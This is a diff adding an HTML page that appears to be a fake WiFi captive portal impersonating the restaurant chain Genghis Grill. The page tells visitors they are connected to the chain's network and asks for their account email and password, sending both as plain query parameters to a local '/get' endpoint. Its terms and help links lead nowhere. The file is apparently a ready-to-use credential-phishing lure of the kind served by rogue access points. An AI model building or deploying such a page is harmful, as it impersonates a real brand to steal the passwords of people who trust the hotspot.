@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Genghis Grill WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef0f4;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;width:100%;max-width:420px;border-radius:20px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.15)}
+.card-top{background:#CC0000;padding:28px 24px 20px;text-align:center}
+.bname{font-size:24px;font-weight:900;color:#fff;letter-spacing:0.3px;line-height:1.1}
+.btag{font-size:11px;color:rgba(255,255,255,0.7);letter-spacing:2px;text-transform:uppercase;margin-top:6px}
+.card-mid{background:#1a1a1a;padding:9px 20px;display:flex;align-items:center;gap:8px}
+.dot{width:7px;height:7px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.25)}
+.ssid{font-size:12px;color:rgba(255,255,255,0.9);font-weight:500;letter-spacing:0.3px}
+.ssid strong{font-weight:700}
+.card-body{padding:26px 24px 20px}
+.card-body h2{font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:3px}
+.card-body .sub{font-size:13px;color:#999;margin-bottom:4px}
+.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#777;margin-bottom:7px;margin-top:18px}
+input{width:100%;padding:13px 15px;border:1.5px solid #eaeaea;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
+input:focus{outline:none;border-color:#CC0000;box-shadow:0 0 0 3px #CC000018}
+input::placeholder{color:#c0c0c0}
+.btn{width:100%;padding:14px;border:none;border-radius:10px;background:#CC0000;color:#fff;font-size:14px;font-weight:800;letter-spacing:0.5px;cursor:pointer;margin-top:20px}
+.btn:active{opacity:0.9}
+.terms{font-size:11.5px;color:#bbb;text-align:center;margin-top:13px;line-height:1.6}
+.terms a{color:#CC0000;text-decoration:none}
+.card-foot{background:#f8f8f8;border-top:1px solid #f0f0f0;padding:12px 24px;display:flex;justify-content:space-between;align-items:center}
+.card-foot span{font-size:11px;color:#ccc}
+.card-foot a{font-size:11px;color:#CC0000;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="card-top">
+    <div class="bname">Genghis Grill</div>
+    <div class="btag">Build Your Own Stir Fry</div>
+  </div>
+  <div class="card-mid">
+    <div class="dot"></div>
+    <span class="ssid">Connected to: <strong>GenghisGrill_WiFi</strong></span>
+  </div>
+  <div class="card-body">
+    <h2>Guest Sign In</h2>
+    <p class="sub">Sign in with your Genghis Grill account to connect.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Connect to WiFi &rarr;</button>
+      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
+    </form>
+  </div>
+  <div class="card-foot">
+    <span>&copy; Genghis Grill</span>
+    <a href="#">Help</a>
+  </div>
+</div>
+</body>
+</html>
